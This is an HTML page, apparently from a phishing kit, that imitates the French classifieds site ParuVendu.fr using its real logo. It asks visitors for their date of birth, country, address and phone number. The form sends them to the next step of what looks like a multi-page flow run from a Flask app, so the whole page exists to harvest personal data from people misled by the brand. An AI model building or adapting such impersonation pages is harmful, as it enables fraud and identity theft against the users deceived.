<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations supplémentaires - ParuVendu.fr</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
            background-position: right;
            background-repeat: no-repeat;
            background-size: contain;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .logo img {
            width: 200px;
        }
        .container {
            width: 35%; /* Largeur du formulaire augmentée */
            padding: 30px; /* Padding */
            background: white;
            border-radius: 30px; /* Bords plus enrobés */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: absolute;
            top: 30%; /* Hauteur */
            left: 15%; /* Déplacé plus à gauche */
            transform: translateY(-30%);
            animation: slideUp 1s ease-out;
        }
        @keyframes slideUp {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(-30%);
            }
        }
        .form-group {
            margin-bottom: 15px; /* Espacement entre les champs */
            text-align: left;
        }
        input, select {
            width: 100%; /* Largeur des champs */
            padding: 12px; /* Padding */
            border: 1px solid #ccc;
            border-radius: 0; /* Bordures rectangulaires */
            font-size: 14px;
            transition: all 0.3s;
            background-color: #f9f9f9;
            box-sizing: border-box; /* Assure que la largeur inclut le padding */
        }
        input:focus, select:focus {
            border-color: #ff4c4c;
            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
        }
        .btn {
            background-color: #cc0000; /* Rouge plus foncé */
            color: white;
            padding: 8px 20px; /* Taille réduite */
            border: none;
            border-radius: 20px;
            cursor: pointer;
            width: 40%; /* Bouton plus petit */
            font-size: 14px; /* Taille du texte */
            transition: background 0.3s;
            text-transform: lowercase; /* Mise en minuscule */
            margin-left: auto;
            margin-right: auto;
            display: block;
            font-weight: bold; /* Texte en gras */
        }
        .btn:hover {
            background-color: #b30000; /* Rouge plus foncé au survol */
        }
        .connexion-text {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #ff4c4c;
            margin-bottom: 20px;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            width: 100px; /* Taille du logo */
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu.fr">
    </div>
    <div class="container">
        <div class="connexion-text">Complétez vos informations</div>
        <div class="form-logo">
            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
        </div>
        <form action="{{ url_for('next_page', current_page='paruinformations') }}" method="GET">
            <div class="form-group">
                <label for="birthdate">Date de naissance (JJ/MM/AAAA)</label>
                <input type="text" id="birthdate" placeholder="JJ/MM/AAAA" required>
            </div>
            <div class="form-group">
                <label for="country">Pays</label>
                <select id="country" required>
                    <option value="">Sélectionnez votre pays</option>
                    <option value="france">France</option>
                    <option value="belgique">Belgique</option>
                    <option value="suisse">Suisse</option>
                    <option value="allemagne">Allemagne</option>
                    <option value="espagne">Espagne</option>
                    <option value="italie">Italie</option>
                    <option value="portugal">Portugal</option>
                    <option value="royaume-uni">Royaume-Uni</option>
                    <option value="irlande">Irlande</option>
                    <option value="pays-bas">Pays-Bas</option>
                    <option value="luxembourg">Luxembourg</option>
                    <option value="autriche">Autriche</option>
                    <option value="danemark">Danemark</option>
                    <option value="suede">Suède</option>
                    <option value="finlande">Finlande</option>
                    <option value="norvege">Norvège</option>
                    <option value="pologne">Pologne</option>
                    <option value="republique-tcheque">République Tchèque</option>
                    <option value="hongrie">Hongrie</option>
                    <option value="slovaquie">Slovaquie</option>
                    <option value="grece">Grèce</option>
                    <option value="turquie">Turquie</option>
                    <option value="canada">Canada</option>
                    <option value="etats-unis">États-Unis</option>
                    <option value="australie">Australie</option>
                    <option value="nouvelle-zelande">Nouvelle-Zélande</option>
                    <!-- Pays africains -->
                    <option value="maroc">Maroc</option>
                    <option value="algerie">Algérie</option>
                    <option value="tunisie">Tunisie</option>
                    <option value="senegal">Sénégal</option>
                    <option value="cote-divoire">Côte d'Ivoire</option>
                    <option value="cameroun">Cameroun</option>
                    <option value="nigeria">Nigeria</option>
                    <option value="ghana">Ghana</option>
                    <option value="kenya">Kenya</option>
                    <option value="afrique-du-sud">Afrique du Sud</option>
                    <option value="egypte">Égypte</option>
                    <option value="mali">Mali</option>
                    <option value="benin">Bénin</option>
                    <option value="togo">Togo</option>
                    <option value="burkina-faso">Burkina Faso</option>
                    <!-- Autres pays -->
                    <option value="japon">Japon</option>
                    <option value="chine">Chine</option>
                    <option value="inde">Inde</option>
                    <option value="bresil">Brésil</option>
                    <option value="argentine">Argentine</option>
                </select>
            </div>
            <div class="form-group">
                <label for="address">Adresse</label>
                <input type="text" id="address" required>
            </div>
            <div class="form-group">
                <label for="phone">Numéro de téléphone</label>
                <input type="tel" id="phone" required>
            </div>
            <button type="submit" class="btn">Confirmer</button>
        </form>
    </div>
</body>
</html>
